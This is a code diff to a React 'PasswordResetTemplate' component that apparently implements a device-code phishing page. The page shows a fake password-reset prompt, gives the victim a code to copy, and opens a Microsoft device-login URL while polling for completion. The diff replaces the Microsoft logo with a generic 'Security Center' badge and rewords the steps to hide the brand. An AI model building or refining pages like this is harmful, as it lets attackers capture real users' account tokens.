@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
+const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 
 type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
@@ -82,7 +82,7 @@ export function PasswordResetTemplate(): React.ReactElement {
     navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
   }
 
-  function handleVerify(): void { setState('waiting'); window.open(DEVICE_AUTH_URL, '_blank'); }
+  function handleVerify(): void { setState('waiting'); window.open(DEVICE_VERIFY_URL, '_blank'); }
 
   function handleReset(): void {
     stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
@@ -95,13 +95,10 @@ export function PasswordResetTemplate(): React.ReactElement {
     <div className="pwd-reset-page">
       <div className="pwd-reset-container">
         <div className="pwd-reset-logo-bar">
-          <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
-            <rect width="11" height="11" fill="#f25022" />
-            <rect x="12" width="11" height="11" fill="#7fba00" />
-            <rect y="12" width="11" height="11" fill="#00a4ef" />
-            <rect x="12" y="12" width="11" height="11" fill="#ffb900" />
-            <text x="28" y="17" fill="#5e5e5e" fontSize="16" fontFamily="Segoe UI, sans-serif" fontWeight="600">Microsoft</text>
-          </svg>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2" /><path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg>
+            <span style={{ fontSize: 18, fontWeight: 600, color: '#5e5e5e' }}>Security Center</span>
+          </div>
         </div>
 
         <div className="pwd-reset-card">
@@ -157,8 +154,8 @@ export function PasswordResetTemplate(): React.ReactElement {
               </div>
               <ol className="pwd-reset-steps">
                 <li>Copy the code shown above</li>
-                <li>Click "Verify" to open the Microsoft verification page</li>
-                <li>Paste the code and sign in with your account</li>
+                <li>Click "Verify" to open the verification page</li>
+                <li>Paste the code and verify your account</li>
               </ol>
               <button className="pwd-reset-btn" onClick={handleVerify}>Verify</button>
               {state === 'waiting' && <p className="pwd-reset-waiting">Waiting for you to complete verification...</p>}
